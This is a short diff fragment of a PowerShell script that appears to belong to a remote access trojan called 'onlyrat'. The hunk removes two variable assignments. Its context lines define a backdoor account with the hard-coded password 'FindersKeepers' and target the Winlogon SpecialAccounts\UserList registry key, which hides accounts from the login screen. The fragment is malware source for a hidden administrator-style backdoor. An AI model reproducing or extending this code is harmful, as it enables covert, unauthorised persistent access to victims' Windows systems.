@@ -27,9 +27,6 @@ $dirName = randomText
 $uName = "onlyrat"
 $pWord = (ConvertTo-SecureString  "FindersKeepers" -AsPlainText -Force)
 
-$regName = randomText
-$vbsName = randomText
-
 $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
 
 ## goto Temp and start 
